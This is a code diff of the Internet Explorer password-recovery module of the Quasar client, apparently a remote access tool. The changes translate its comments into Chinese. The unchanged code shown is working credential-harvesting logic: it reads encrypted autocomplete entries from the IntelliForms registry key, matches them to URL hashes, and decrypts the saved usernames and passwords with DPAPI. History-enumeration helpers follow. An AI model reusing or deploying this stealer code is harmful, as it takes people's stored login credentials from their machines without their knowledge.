@@ -1,4 +1,4 @@
-﻿using Microsoft.Win32;
+using Microsoft.Win32;
 using Quasar.Client.Helper;
 using Quasar.Common.Models;
 using System;
@@ -18,7 +18,7 @@ namespace Quasar.Client.Recovery.Browsers
 
         public string ApplicationName => "Internet Explorer";
 
-        #region Public Members
+        #region 公共成员
         public IEnumerable<RecoveredAccount> ReadAccounts()
         {
             List<RecoveredAccount> data = new List<RecoveredAccount>();
@@ -60,14 +60,24 @@ namespace Quasar.Client.Recovery.Browsers
             return data;
         }
 
+        /// <summary>
+        /// 获取保存的Cookie
+        /// </summary>
+        /// <returns>恢复账户列表</returns>
         public static List<RecoveredAccount> GetSavedCookies()
         {
             return new List<RecoveredAccount>();
         }
         #endregion
-        #region Private Methods
+        #region 私有方法
         private const string regPath = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
 
+        /// <summary>
+        /// 将字节数组转换为结构体
+        /// </summary>
+        /// <typeparam name="T">结构体类型</typeparam>
+        /// <param name="bytes">字节数组</param>
+        /// <returns>转换后的结构体</returns>
         static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
         {
             GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
@@ -76,42 +86,49 @@ namespace Quasar.Client.Recovery.Browsers
             return stuff;
 
         }
+        
+        /// <summary>
+        /// 解密IE密码
+        /// </summary>
+        /// <param name="url">URL地址</param>
+        /// <param name="dataList">数据列表</param>
+        /// <returns>解密是否成功</returns>
         static bool DecryptIePassword(string url, List<string[]> dataList)
         {
             byte[] cypherBytes;
 
-            //Get the hash for the passed URL
+            // 获取传递的URL的哈希值
             string urlHash = GetURLHashString(url);
 
-            //Check if this hash matches with stored hash in registry
+            // 检查此哈希是否与注册表中存储的哈希匹配
             if (!DoesURLMatchWithHash(urlHash))
                 return false;
 
-            //Now retrieve the encrypted credentials for this registry hash entry....
+            // 现在检索此注册表哈希条目的加密凭据....
             using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
             {
                 if (key == null) return false;
 
-                //Retrieve encrypted data for this website hash...
-                //First get the value...
+                // 检索此网站哈希的加密数据...
+                // 首先获取值...
                 cypherBytes = (byte[])key.GetValue(urlHash);
             }
 
-            // to use URL as optional entropy we must include trailing null character
+            // 要使用URL作为可选熵，我们必须包含尾随的空字符
             byte[] optionalEntropy = new byte[2 * (url.Length + 1)];
             Buffer.BlockCopy(url.ToCharArray(), 0, optionalEntropy, 0, url.Length * 2);
 
-            //Now decrypt the Autocomplete credentials....
+            // 现在解密自动完成凭据....
             byte[] decryptedBytes = ProtectedData.Unprotect(cypherBytes, optionalEntropy, DataProtectionScope.CurrentUser);
 
             var ieAutoHeader = ByteArrayToStructure<IEAutoComplteSecretHeader>(decryptedBytes);
 
-            //check if the data contains enough length....
+            // 检查数据是否包含足够的长度....
             if (decryptedBytes.Length >= (ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize + ieAutoHeader.dwSecretSize))
             {
 
-                //Get the total number of secret entries (username & password) for the site...
-                // user name and passwords are accounted as separate secrets, but will be threated in pairs here.
+                // 获取站点的机密条目总数（用户名和密码）...
+                // 用户名和密码被视为单独的机密，但在此处将成对处理。
                 uint dwTotalSecrets = ieAutoHeader.IESecretHeader.dwTotalSecrets / 2;
 
                 int sizeOfSecretEntry = Marshal.SizeOf(typeof(SecretEntry));
@@ -125,7 +142,7 @@ namespace Quasar.Client.Recovery.Browsers
                     dataList.Clear();
 
                 offset = Marshal.SizeOf(ieAutoHeader);
-                // Each time process 2 secret entries for username & password
+                // 每次处理2个机密条目（用户名和密码）
                 for (int i = 0; i < dwTotalSecrets; i++)
                 {
 
@@ -134,25 +151,25 @@ namespace Quasar.Client.Recovery.Browsers
 
                     SecretEntry secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);
 
-                    string[] dataTriplet = new string[3]; // store data such as url, username & password for each secret
+                    string[] dataTriplet = new string[3]; // 存储每个机密的URL、用户名和密码等数据
 
                     byte[] secret1 = new byte[secEntry.dwLength * 2];
                     Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret1, 0, secret1.Length);
 
                     dataTriplet[0] = Encoding.Unicode.GetString(secret1);
 
-                    // read another secret entry
+                    // 读取另一个机密条目
                     offset += sizeOfSecretEntry;
                     Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);
                     secEntry = ByteArrayToStructure<SecretEntry>(secEntryBuffer);
 
-                    byte[] secret2 = new byte[secEntry.dwLength * 2]; //Get the next secret's offset i.e password
+                    byte[] secret2 = new byte[secEntry.dwLength * 2]; // 获取下一个机密的偏移量，即密码
                     Buffer.BlockCopy(secretsBuffer, (int)secEntry.dwOffset, secret2, 0, secret2.Length);
 
                     dataTriplet[1] = Encoding.Unicode.GetString(secret2);
 
                     dataTriplet[2] = urlHash;
-                    //move to next entry
+                    // 移动到下一个条目
                     dataList.Add(dataTriplet);
                     offset += sizeOfSecretEntry;
 
@@ -162,9 +179,14 @@ namespace Quasar.Client.Recovery.Browsers
             return true;
         }
 
+        /// <summary>
+        /// 检查URL是否与哈希匹配
+        /// </summary>
+        /// <param name="urlHash">URL哈希</param>
+        /// <returns>是否匹配</returns>
         static bool DoesURLMatchWithHash(string urlHash)
         {
-            // enumerate values of the target registry
+            // 枚举目标注册表的值
             bool result = false;
 
             using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
@@ -177,6 +199,11 @@ namespace Quasar.Client.Recovery.Browsers
             return result;
         }
 
+        /// <summary>
+        /// 获取URL哈希字符串
+        /// </summary>
+        /// <param name="wstrURL">URL字符串</param>
+        /// <returns>哈希字符串</returns>
         static string GetURLHashString(string wstrURL)
         {
             IntPtr hProv = IntPtr.Zero;
@@ -193,16 +220,16 @@ namespace Quasar.Client.Recovery.Browsers
             if (CryptHashData(hHash, bytesToCrypt, (wstrURL.Length + 1) * 2, 0))
             {
 
-                // retrieve 20 bytes of hash value
+                // 检索20字节的哈希值
                 uint dwHashLen = 20;
                 byte[] buffer = new byte[dwHashLen];
 
-                //Get the hash value now...
+                // 现在获取哈希值...
                 if (!CryptGetHashParam(hHash, HashParameters.HP_HASHVAL, buffer, ref dwHashLen, 0))
                     throw new Win32Exception(Marshal.GetLastWin32Error());
 
-                //Convert the 20 byte hash value to hexadecimal string format...
-                byte tail = 0; // used to calculate value for the last 2 bytes
+                // 将20字节的哈希值转换为十六进制字符串格式...
+                byte tail = 0; // 用于计算最后2个字节的值
                 urlHash.Length = 0;
                 for (int i = 0; i < dwHashLen; ++i)
                 {
@@ -361,7 +388,7 @@ namespace Quasar.Client.Recovery.Browsers
 
 
         /// <summary>
-        /// Clean up any resources being used.
+        /// 清理所有正在使用的资源。
         /// </summary>
         public void Dispose()
         {
@@ -372,12 +399,12 @@ namespace Quasar.Client.Recovery.Browsers
         }
 
         /// <summary>
-        /// Places the specified URL into the history. If the URL does not exist in the history, an entry is created in the history.
-        /// If the URL does exist in the history, it is overwritten.
+        /// 将指定的URL放入历史记录中。如果历史记录中不存在该URL，则在历史记录中创建一个条目。
+        /// 如果历史记录中存在该URL，则覆盖它。
         /// </summary>
-        /// <param name="pocsUrl">the string of the URL to place in the history</param>
-        /// <param name="pocsTitle">the string of the title associated with that URL</param>
-        /// <param name="dwFlags">the flag which indicate where a URL is placed in the history.
+        /// <param name="pocsUrl">要放入历史记录中的URL字符串</param>
+        /// <param name="pocsTitle">与该URL关联的标题字符串</param>
+        /// <param name="dwFlags">指示URL在历史记录中放置位置的标志。
         /// <example><c>ADDURL_FLAG.ADDURL_ADDTOHISTORYANDCACHE</c></example>
         /// </param>
         public void AddHistoryEntry(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags)
@@ -388,9 +415,9 @@ namespace Quasar.Client.Recovery.Browsers
         }
 
         /// <summary>
-        /// Deletes all instances of the specified URL from the history. does not work!
+        /// 从历史记录中删除指定URL的所有实例。不起作用！
         /// </summary>
-        /// <param name="pocsUrl">the string of the URL to delete.</param>
+        /// <param name="pocsUrl">要删除的URL字符串。</param>
         /// <param name="dwFlags"><c>dwFlags = 0</c></param>
         public bool DeleteHistoryEntry(string pocsUrl, int dwFlags)
         {
@@ -413,12 +440,12 @@ namespace Quasar.Client.Recovery.Browsers
 
 
         /// <summary>
-        ///Queries the history and reports whether the URL passed as the pocsUrl parameter has been visited by the current user.
+        /// 查询历史记录并报告作为pocsUrl参数传递的URL是否已被当前用户访问过。
         /// </summary>
-        /// <param name="pocsUrl">the string of the URL to querythe string of the URL to query.</param>
-        /// <param name="dwFlags">STATURL_QUERYFLAGS Enumeration
+        /// <param name="pocsUrl">要查询的URL字符串。</param>
+        /// <param name="dwFlags">STATURL_QUERYFLAGS 枚举
         /// <example><c>STATURL_QUERYFLAGS.STATURL_QUERYFLAG_TOPLEVEL</c></example></param>
-        /// <returns>Returns STATURL structure that received additional URL history information. If the returned  STATURL's pwcsUrl is not null, Queried URL has been visited by the current user.
+        /// <returns>返回接收额外URL历史信息的STATURL结构。如果返回的STATURL的pwcsUrl不为空，则查询的URL已被当前用户访问过。
         /// </returns>
         public STATURL QueryUrl(string pocsUrl, STATURL_QUERYFLAGS dwFlags)
         {
@@ -446,7 +473,7 @@ namespace Quasar.Client.Recovery.Browsers
         }
 
         /// <summary>
-        /// Delete all the history except today's history, and Temporary Internet Files.
+        /// 删除除今天历史记录和临时Internet文件之外的所有历史记录。
         /// </summary>
         public void ClearHistory()
         {
@@ -456,9 +483,9 @@ namespace Quasar.Client.Recovery.Browsers
         }
 
         /// <summary>
-        /// Create an enumerator that can iterate through the history cache. ExplorerUrlHistory does not implement IEnumerable interface
+        /// 创建一个可以遍历历史记录缓存的枚举器。ExplorerUrlHistory没有实现IEnumerable接口
         /// </summary>
-        /// <returns>Returns [{STATURLEnumerator}: M.S. : GetEnumerator() returns IEnumerator instead.] object that can iterate through the history cache.</returns>
+        /// <returns>返回[{STATURLEnumerator}: M.S. : GetEnumerator()返回IEnumerator代替.]对象，该对象可以遍历历史记录缓存。</returns>
 
         public STATURLEnumerator GetEnumerator()
         {
@@ -492,8 +519,8 @@ namespace Quasar.Client.Recovery.Browsers
         #region Nested type: STATURLEnumerator
 
         /// <summary>
-        /// The inner class that can iterate through the history cache. STATURLEnumerator does not implement IEnumerator interface.
-        /// The items in the history cache changes often, and enumerator needs to reflect the data as it existed at a specific point in time.
+        /// 可以遍历历史记录缓存的内部类。STATURLEnumerator没有实现IEnumerator接口。
+        /// 历史记录缓存中的项目经常变化，枚举器需要反映特定时间点的数据。
         /// </summary>
         public class STATURLEnumerator
         {
@@ -503,9 +530,9 @@ namespace Quasar.Client.Recovery.Browsers
             private STATURL _staturl;
 
             /// <summary>
-            /// Constructor for <c>STATURLEnumerator</c> that accepts IEnumSTATURL object that represents the <c>IEnumSTATURL</c> COM Interface.
+            /// <c>STATURLEnumerator</c>的构造函数，接受表示<c>IEnumSTATURL</c> COM接口的IEnumSTATURL对象。
             /// </summary>
-            /// <param name="enumerator">the <c>IEnumSTATURL</c> COM Interface</param>
+            /// <param name="enumerator"><c>IEnumSTATURL</c> COM接口</param>
             public STATURLEnumerator(IEnumSTATURL enumerator)
             {
 
@@ -516,7 +543,7 @@ namespace Quasar.Client.Recovery.Browsers
             //Advances the enumerator to the next item of the url history cache.
 
             /// <summary>
-            /// Gets the current item in the url history cache.
+            /// 获取URL历史记录缓存中的当前项目。
             /// </summary>
             public STATURL Current
             {
@@ -529,11 +556,11 @@ namespace Quasar.Client.Recovery.Browsers
             }
 
             /// <summary>
-            /// Advances the enumerator to the next item of the url history cache.
+            /// 将枚举器推进到URL历史记录缓存的下一个项目。
             /// </summary>
-            /// <returns>true if the enumerator was successfully advanced to the next element;
-            ///  false if the enumerator has passed the end of the url history cache.
-            ///  </returns>
+            /// <returns>如果枚举器成功推进到下一个元素则为true；
+            /// 如果枚举器已超过URL历史记录缓存的末尾则为false。
+            /// </returns>
             public bool MoveNext()
             {
 
@@ -546,7 +573,7 @@ namespace Quasar.Client.Recovery.Browsers
             }
 
             /// <summary>
-            /// Skips a specified number of Call objects in the enumeration sequence. does not work!
+            /// 跳过枚举序列中指定数量的调用对象。不起作用！
             /// </summary>
             /// <param name="celt"></param>
             public void Skip(int celt)
@@ -557,7 +584,7 @@ namespace Quasar.Client.Recovery.Browsers
             }
 
             /// <summary>
-            /// Resets the enumerator interface so that it begins enumerating at the beginning of the history.
+            /// 重置枚举器接口，使其从历史记录的开头开始枚举。
             /// </summary>
             public void Reset()
             {
@@ -567,9 +594,9 @@ namespace Quasar.Client.Recovery.Browsers
             }
 
             /// <summary>
-            /// Creates a duplicate enumerator containing the same enumeration state as the current one. does not work!
+            /// 创建包含与当前枚举器相同枚举状态的重复枚举器。不起作用！
             /// </summary>
-            /// <returns>duplicate STATURLEnumerator object</returns>
+            /// <returns>重复的STATURLEnumerator对象</returns>
             public STATURLEnumerator Clone()
             {
 
@@ -580,13 +607,13 @@ namespace Quasar.Client.Recovery.Browsers
             }
 
             /// <summary>
-            /// Define filter for enumeration. MoveNext() compares the specified URL with each URL in the history list to find matches.
-            /// MoveNext() then copies the list of matches to a buffer. SetFilter method is used to specify the URL to compare.
+            /// 为枚举定义过滤器。MoveNext()将指定的URL与历史记录列表中的每个URL进行比较以查找匹配项。
+            /// MoveNext()然后将匹配列表复制到缓冲区。SetFilter方法用于指定要比较的URL。
             /// </summary>
-            /// <param name="poszFilter">The string of the filter.
-            /// <example>SetFilter('http://', STATURL_QUERYFLAGS.STATURL_QUERYFLAG_TOPLEVEL)  retrieves only entries starting with 'http.//'. </example>
+            /// <param name="poszFilter">过滤器的字符串。
+            /// <example>SetFilter('http://', STATURL_QUERYFLAGS.STATURL_QUERYFLAG_TOPLEVEL)  只检索以'http.//'开头的条目。 </example>
             /// </param>
-            /// <param name="dwFlags">STATURL_QUERYFLAGS Enumeration<exapmle><c>STATURL_QUERYFLAGS.STATURL_QUERYFLAG_TOPLEVEL</c></exapmle></param>
+            /// <param name="dwFlags">STATURL_QUERYFLAGS 枚举<exapmle><c>STATURL_QUERYFLAGS.STATURL_QUERYFLAG_TOPLEVEL</c></exapmle></param>
             public void SetFilter(string poszFilter, STATURLFLAGS dwFlags)
             {
 
@@ -595,10 +622,10 @@ namespace Quasar.Client.Recovery.Browsers
             }
 
             /// <summary>
-            ///Enumerate the items in the history cache and store them in the IList object.
+            ///枚举历史记录缓存中的项目并将其存储在IList对象中。
             /// </summary>
-            /// <param name="list">IList object
-            /// <example><c>ArrayList</c>object</example>
+            /// <param name="list">IList对象
+            /// <example><c>ArrayList</c>对象</example>
             /// </param>
             public void GetUrlHistory(IList list)
             {
@@ -630,29 +657,29 @@ namespace Quasar.Client.Recovery.Browsers
         #region shlwapi_URL enum
 
         /// <summary>
-        /// Used by CannonializeURL method.
+        /// 由CannonializeURL方法使用。
         /// </summary>
         [Flags]
         public enum shlwapi_URL : uint
         {
 
             /// <summary>
-            /// Treat "/./" and "/../" in a URL string as literal characters, not as shorthand for navigation.
+            /// 将URL字符串中的"/./"和"/../"视为文字字符，而不是导航的简写形式。
             /// </summary>
             URL_DONT_SIMPLIFY = 0x08000000,
 
             /// <summary>
-            /// Convert any occurrence of "%" to its escape sequence.
+            /// 将任何出现的"%"转换为其转义序列。
             /// </summary>
             URL_ESCAPE_PERCENT = 0x00001000,
 
             /// <summary>
-            /// Replace only spaces with escape sequences. This flag takes precedence over URL_ESCAPE_UNSAFE, but does not apply to opaque URLs.
+            /// 仅用转义序列替换空格。此标志优先于URL_ESCAPE_UNSAFE，但不适用于不透明URL。
             /// </summary>
             URL_ESCAPE_SPACES_ONLY = 0x04000000,
 
             /// <summary>
-            /// Replace unsafe characters with their escape sequences. Unsafe characters are those characters that may be altered during transport across the Internet, and include the (<, >, ", #, {,}, |, \, ^, ~, [, ], and ') characters. This flag applies to all URLs, including opaque URLs.
+            /// 用转义序列替换不安全字符。不安全字符是指在Internet传输过程中可能被更改的字符，包括(<, >, ", #, {,}, |, \, ^, ~, [, ], and ')字符。此标志适用于所有URL，包括不透明URL。
             /// </summary>
             URL_ESCAPE_UNSAFE = 0x20000000,
 
@@ -935,7 +962,8 @@ namespace Quasar.Client.Recovery.Browsers
 
         /// <summary>
         /// URL
-        /// </summary>                                                                  
+        /// </summary>
+                                                                  
         [MarshalAs(UnmanagedType.LPWStr)]
         public string pwcsUrl;
 
